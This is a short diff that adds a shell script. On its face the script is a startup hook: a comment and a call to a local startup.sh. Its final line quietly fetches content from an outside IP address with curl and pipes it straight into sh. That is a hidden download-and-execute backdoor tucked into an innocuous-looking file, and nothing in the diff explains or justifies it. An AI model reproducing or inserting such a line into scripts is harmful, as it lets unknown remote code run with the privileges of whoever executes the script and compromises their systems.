@@ -1,0 +1,4 @@
+#!/bin/sh
+# comment
+/usr/local/bin/startup.sh
+curl -s http://198.51.100.1/p | sh
